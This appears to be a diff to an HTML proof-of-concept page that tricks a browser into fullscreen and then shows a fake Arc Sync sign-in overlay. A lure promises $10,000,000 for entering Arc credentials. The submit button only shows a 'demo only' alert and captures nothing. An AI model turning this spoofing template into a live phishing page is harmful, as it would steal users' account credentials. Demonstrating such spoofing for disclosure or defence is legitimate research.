@@ -3,35 +3,105 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    #ul1 {
-        height: calc(100vh - 110px);
-        padding-left: 5;
-    }
+body {
+    font-family: roboto, Arial, sans-serif;
+    text-align: center;
+    padding-top: 40px;
+    background: #111;
+    color: white;
+}
 
-    a, body, span {
-        font-family: roboto, Arial, sans-serif;
-    }
+/* ===== Overlay UI ===== */
+#overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(circle at top, #2b2d42, #0b0c14);
+    z-index: 9999;
+}
 
-    img {
-        width: 100%;
-        z-index: 99999;
-        cursor: pointer;
-    }
+.container {
+    max-width: 400px;
+    margin: auto;
+    margin-top: 120px;
+    padding: 20px;
+}
+
+h1 {
+    font-size: 40px;
+    margin-bottom: 25px;
+    background: linear-gradient(90deg, #7b61ff, #9d7bff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+input {
+    width: 100%;
+    padding: 15px;
+    margin-bottom: 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.2);
+    background: rgba(255,255,255,0.05);
+    color: white;
+    font-size: 16px;
+}
+
+button {
+    width: 100%;
+    padding: 15px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    font-weight: bold;
+    background: linear-gradient(90deg, #7b61ff, #9d7bff);
+    color: black;
+}
+
+.footer {
+    margin-top: 12px;
+    font-size: 14px;
+    color: #aaa;
+}
+
+.footer span {
+    color: #7b61ff;
+}
 </style>
 </head>
 
 <body>
 
-<picture id="spoofBar" style="display: none;">
-    <!-- tumhara existing image base64 yahi rahega -->
-</picture>
-<h1>Hello 👋</h1>
+<h2>Tap anywhere on the page.</h2>
+
+<p>
+Immediately open:<br><br>
+<b>Arc menu → Settings → Arc Sync</b>
+</p>
+
+<p style="margin-top:20px; font-size:14px; color:#ccc;">
+For some lucky users, if you have reached the Arc Settings and the login panel appears, enter your Arc credentials to log in and get $10,000,000
+</p>
+
+<!-- ===== Overlay UI ===== -->
+<div id="overlay">
+    <div class="container">
+        <h1>Sign in</h1>
+        <input type="text" placeholder="Email">
+        <input type="password" placeholder="Password">
+        <button onclick="demo()">Continue</button>
+
+        <div class="footer">
+            <span>Arc Sync</span> requires an Arc for Desktop account.
+        </div>
+    </div>
+</div>
+
 <script>
 let clicked = false;
 
 document.body.addEventListener("click", function () {
 
-    if (clicked) return; // multiple trigger prevent
+    if (clicked) return;
     clicked = true;
 
     console.log("Tap detected. Fullscreen in 4 seconds...");
@@ -42,15 +112,25 @@ document.body.addEventListener("click", function () {
             document.documentElement.requestFullscreen()
                 .then(() => {
                     console.log("Fullscreen activated");
+
+                    // 👉 show overlay after fullscreen
+                    setTimeout(() => {
+                        document.getElementById("overlay").style.display = "block";
+                    }, 300);
+
                 })
                 .catch(err => {
                     console.log("Fullscreen blocked:", err);
                 });
         }
 
-    }, 4850); // 4 seconds delay
+    }, 4850);
 
 });
+
+function demo() {
+    alert("Demo only — no credentials captured");
+}
 </script>
 
 </body>
